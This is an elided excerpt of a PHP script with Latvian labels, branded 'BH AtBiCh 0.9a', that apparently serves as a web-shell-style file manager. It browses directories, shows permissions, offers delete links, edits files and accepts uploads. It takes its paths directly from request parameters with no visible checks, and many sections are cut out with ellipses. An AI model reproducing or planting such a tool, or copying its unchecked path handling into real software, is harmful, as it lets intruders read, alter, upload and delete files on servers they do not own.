...
$versija='⚒ BH AtBiCh 0.9a (Pie Bagātās Kuces) ⚒';
$cook_name='eee';
$key_sec=rand_str();
	...
	if($parbaudadir=opendir($dir)){
		...
		if(count($lasitdir)>0){
			...
			for($j=0;$j<count($lasitdir);$j++){
				...
				$druka='<div class="'.$dir_css.'" onmouseover="fa(this);" onmouseout="fb(this);">'.$skat.' '.$imgdir1.'<em class="dir">'.$saite.'</em><em class="chmod">'.substr(base_convert(fileperms($dir.'/'.$lasitdir[$j]),10,8),2).'</em><em class="kb">'.ceil(filesize($dir.'/'.$lasitdir[$j])/1024).' KiB</em><em class="data">'.gmdate('[ Y-m-d, H:i:s ]',2*3600+filemtime($dir.'/'.$lasitdir[$j])).'</em>  <del title="dzēst!">'.$saitedzd.'</del></div>
';
...
';
		if(count($lasitfailus)>0){
			...
			for($k=0;$k<count($lasitfailus);$k++){
				...
				$druka='<div class="'.$filu_css.'" onmouseover="fa(this);" onmouseout="fb(this);"> '.$skat.$sleja.' '.$moz_icon.'<em class="dir">'.$saite.'</em><em class="chmod">'.substr(base_convert(fileperms($dir.'/'.$lasitfailus[$k]),10,8),3).'</em><em class="kb">'.ceil(filesize($dir.'/'.$lasitfailus[$k])/1024).' KiB</em><em class="data">'.gmdate('[ Y-m-d, H:i:s ]',2*3600+filemtime($dir.'/'.$lasitfailus[$k])).'</em>  <del title="dzēst!">'.$saitedz.'</del></div>
';
...
# laboteejamais :
echo'<div class="apaksa"><h3>Redaktors:</h3><div class="forma">';
if(isset($_GET['ejam'])){
	$dir=$_GET['dir'];
}
...
if((p('cx')!=p('dirx'))&&($_POST['dzdir']=='yes')){
	$uzaugshu=$dir;
}
if(p('cp')=='yes'){
	$c=p('cx');
...
if(file_exists($f)){
	if(filetype($f)=='file'){
		echo'<p>Datnes tiesības(chmod) : '.substr(base_convert(fileperms($f),10,8),3).'</p>';
	}
	if(filetype($f)=='dir'){
		echo'<p>Direktorijas tiesības(chmod) : ';
		echo substr(base_convert(fileperms($f),10,8),2);
		echo'</p>';
	}
}
if(isset($c)){
...
<p>
Esošā darba direktorija :  <input class="balts" name="dirx" type="text" size="60" readonly="readonly" value="'.$dir.'" />
</p>
<p>
...
if(isset($_POST['su'])&&!empty($_FILES['file'])){
	...
	if(empty($_FILES['file']['name'])){
		die('<h1>A taa nevar! <a href="'.$pats.'?dir='.$dir.'">Iet atpakalj</a></h1>');
	}
	if(file_exists($kurlikt)){
		die('<h1>Nevar, jo fails '.$lol.' jau ir! <a href="'.$pats.'?dir='.$dir.'">Iet atpakalj</a></h1>');
	}
